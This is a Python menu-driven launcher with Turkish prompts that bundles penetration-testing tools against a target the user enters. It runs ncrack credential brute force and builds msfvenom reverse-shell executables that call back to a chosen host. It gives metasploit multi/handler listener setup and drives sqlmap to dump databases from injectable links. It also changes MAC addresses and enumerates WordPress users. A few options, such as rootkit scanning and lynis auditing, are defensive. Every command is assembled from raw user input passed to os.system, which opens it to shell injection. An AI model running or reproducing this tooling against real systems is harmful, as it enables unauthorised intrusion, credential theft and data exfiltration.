#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import os
import py_compile
import subprocess
from pyfiglet import Figlet

def main():
    figletFont = Figlet(font='slant')
    os.system("clear")
    print(figletFont.renderText("Siber Güvenlik Araclari AIO"))

    loadingMessage = "Tüm fonksiyonları kullanabilmek için programı root yetkisi ile çalıştırın!"
    print(loadingMessage)
    print("[                    ] 0% ")
    time.sleep(1)
    print("[==========          ] 50%")
    time.sleep(1)
    print("[====================] 100%")
    time.sleep(3)

    os.system("clear")

    while True:
        print("""
        Yapmak İstediğiniz Fonksiyonu Seçin
	1-  VPN Kontrol (Ike-scan)
	2-  Sunucu Zaafiyet Analizi (Nikto)
	3-  Exploit Ara (Searchsploit)
	4-  Güvenlik Duvarı Tespiti (wafw00f)
	5-  Güvenlik Duvarı Listesi (wafw00f)
	6-  MAC Adresi Değiştir (macchanger)
	7-  (Port) Brute Force (ncrack)
	8-  Rootkit Tarama (chrootkit & rkhunter)
	9-  Payload Oluştur (msfvenom)
	10- Payload Dinle
	11- Veritabanı İstismarı (sqlmap)
	12- Wordlist Oluştur (crunch)
	13- Linux Güvenlik Aracı (lynis)
	14- WordPress Tarama (wpscan)
        """)

        transactionNumber = input("Yapmak İstediğiniz Fonksiyon Numarasını Girin (Programı sonlandırmak için 'q' girin): ")

        if transactionNumber == "q":
            print("Program Sonlandırılıyor...")
            break
        elif transactionNumber == "1":
            targetIp = input("Hedef IP adresini girin: ")
            os.system("ike-scan "+ targetIp)
        elif transactionNumber == "2":
            targetIp = input("Hedef IP adresini girin: ")
            os.system("nikto -h "+ targetIp)    
        elif transactionNumber == "3":
            keyVal = input("Exploit Aramak için Anahtar kelime girin: ")
            os.system("searchsploit "+ keyVal)   
        elif transactionNumber == "4":
            targetIp = input("Hedef IP adresini girin: ")
            os.system("wafw00f "+ targetIp)     
        elif transactionNumber == "5":
            os.system("wafw00f -l")               
        elif transactionNumber == "6":
            os.system("clear")
            print("""Yapmak istediğiniz işlemi seçin
            1- MAC Adresini Rastgele Değiştir
            2- MAC Adresini Manuel Değiştir
            3- Orjinal MAC Adresine dön
            """) 
            subTransactionNumber = input("Seçiminizi yapın: ")
            
            if subTransactionNumber == "1":
                os.system("ifconfig eth0 down")
                os.system("macchanger -r eth0")
                os.system("ifconfig eth0 up")
                print("MAC Adresi Rastgele Değiştirildi..")
                
            elif subTransactionNumber == "2":
                print("Örnek: 4a:07:a5:1c:f7:06")
                macDesired=input("İstenen MAC Adresini girin: ")
                os.system("ifconfig eth0 down")
                os.system("macchanger --mac " + macDesired + " eth0")
                os.system("ifconfig eth0 up")
                print("MAC Adresi Manuel Olarak Değiştirildi..")
                
            elif subTransactionNumber == "3":
                os.system("ifconfig eth0 down")
                os.system("macchanger -p eth0")
                os.system("ifconfig eth0 up")
                print("MAC Adresi Orjinal Olarak Değiştirildi..")    
            
            else:
                print("Geçersiz giriş.")
                           
                
                
        elif transactionNumber == "7":
            os.system("clear")
            targetIp=input("Hedef IP Adresini Girin: ")
            usr=input("Kullanıcı adlarını içeren dosya yolunu girin: ")
            passwd=input("Parolaları içeren dosya yolunu girin: ")
            port=input("Port Numarasını girin: ")
            os.system("ncrack -p "+port+" -U "+ usr + " -P "+passwd+" "+targetIp)   
        elif transactionNumber == "8":
            os.system("clear")
            os.system("sudo apt-get install chkrootkit -y")
            os.system("sudo apt-get install rkhunter -y")
            os.system("clear")
            print("""Kullanmak istediğiniz aracı seçin
            1- chrootkit
            2- rkhunter
            """) 
            subTransactionNumber = input("Seçiminizi yapın: ")
            
            if subTransactionNumber == "1":
                os.system("chkrootkit")
                print("Tarama Bitti..")
                
            elif subTransactionNumber == "2":
                os.system("rkhunter -c")
                print("Tarama Bitti..")

            
            else:
                print("Geçersiz giriş.")     
                
        elif transactionNumber == "9":
            os.system("clear")
            print("""Yapmak istediğiniz işlemi seçin
            1- Payload Oluştur
            2- Payload Seç (metasploit)
            """) 
            subTransactionNumber = input("Seçiminizi yapın: ")
            
            if subTransactionNumber == "1":
                ip=input("Yerel veya Dış IP Adresini girin: ")
                port=input("Port Numarasını Girin: ")
                payload=input("Payload girin: ")
                print("Örnek: /home/user/Masaüstü/payload.exe")
                save=input("Kaydedilecek Dizin: ")
                os.system("msfvenom -p "+payload+" LHOST="+ip+" LPORT="+port+" -f exe -o "+save)
                
            elif subTransactionNumber == "2":
                os.system("sudo apt-get install xfce4-terminal -y")
                os.system("clear")
                subprocess.run(["xfce4-terminal", "--command=msfconsole -q"])           
                
            else:
                print("Geçersiz giriş.")     
                
        elif transactionNumber == "10":
            os.system("clear")
            print("""
       Klasör içinde verilen PayloadDinle.txt belgesini açın.
       İçerisindeki bilgileri doldurun ve kaydedin.
       Örnek kullanım:
                
       use multi/handler
       set payload "Buraya payloadınızı girin. Çift tırnaklar olmadan"
       set LHOST "Buraya IP Adresini girin. Çift tırnaklar olmadan"
       set LPORT "Buraya Port Numarasını girin. Çift tırnaklar olmadan"
       exploit 
       
       Kaydettikten sonra terminale "msfconsole -r '/home/user/Masaüstü/PayloadDinle.txt'" çift tırnaklar olmadan.
       Sizin dosyanız hangi dizinde ise düzenleyin ve Enter tuşuna basın.
       
                          """)

        elif transactionNumber == "11":
            os.system("clear")
            print("""Yapmak istediğiniz işlemi seçin
            1- Sadece Açıklı Link Sahibiyim.
            2- Link + Veritabanı Adı Sahibiyim.
            3- Link + Veritabanı Adı + Tablo Adı Sahibiyim.
            4- Link + Veritabanı Adı + Tablo Adı + Kolon Adı Sahibiyim.
            """)

            subTransactionNumber = input("Seçiminizi yapın: ")
            
            if subTransactionNumber == "1":
                link=input("Açıklı Linki girin: ")
                os.system("sqlmap -u "+link+" --dbs --random-agent")
                
            elif subTransactionNumber == "2":
                link=input("Açıklı Linki girin: ")
                vt=input("Veritabanı Adını girin: ")
                os.system("sqlmap -u "+link+" -D "+vt+ " --tables --random-agent")
                
            elif subTransactionNumber == "3":
                link=input("Açıklı Linki girin: ")
                vt=input("Veritabanı Adını girin: ")
                table=input("Tablo Adını girin: ")
                os.system("sqlmap -u "+link+" -D "+vt+ " -T "+table+ " --columns --random-agent")
                
            elif subTransactionNumber == "4":
                link=input("Açıklı Linki girin: ")
                vt=input("Veritabanı Adını girin: ")
                table=input("Tablo Adını girin: ")
                col=input("Kolon Adını girin: ")
                os.system("sqlmap -u "+link+" -D "+vt+ " -T "+table+ " -C "+col+ " --dump --random-agent")  
                
                
        elif transactionNumber == "12":
            os.system("clear")
            minCharacter=input("Minimum Karakter Sayısı: ")
            maxCharacter = input("Maksimum Karakter Sayısı: ") 
            desiredCharacters=input("İstenen Karakterler: ")
            save=input("Kaydedilecek dizin: ")
            os.system("crunch "+minCharacter+" "+maxCharacter+" "+desiredCharacters+" -o "+save)
            
        elif transactionNumber == "13":
            os.system("sudo apt install lynis -y")
            os.system("lynis audit system")
            print("Tarama Bitti...")

        elif transactionNumber == "14":
            os.system("clear")
            print("""
            1- Hızlı Tarama 
            2- Eklenti Tarama
            3- Tema Tarama
            4- Yönetici Kullanıcı Adı Tarama
            """) 
            subTransactionNumber = input("Seçiminizi yapın: ")
            
            if subTransactionNumber == "1":
                ip=input("Site/IP Adresi girin: ")
                os.system("wpscan --url "+ip)
                
            elif subTransactionNumber == "2":
                ip=input("Site/IP Adresi girin: ")
                os.system("wpscan --url "+ip+" --enumerate p")

            elif subTransactionNumber == "3":
                ip=input("Site/IP Adresi girin: ")
                os.system("wpscan --url "+ip+" --enumerate t")
                
            elif subTransactionNumber == "4":
                ip=input("Site/IP Adresi girin: ")
                os.system("wpscan --url "+ip+" --enumerate u")            

            
            else:
                print("Geçersiz giriş.")   
            
           
                
                           
        else:
            print("Geçersiz giriş. Lütfen doğru bir fonksiyon numarası girin.")

if __name__ == "__main__":
    main()
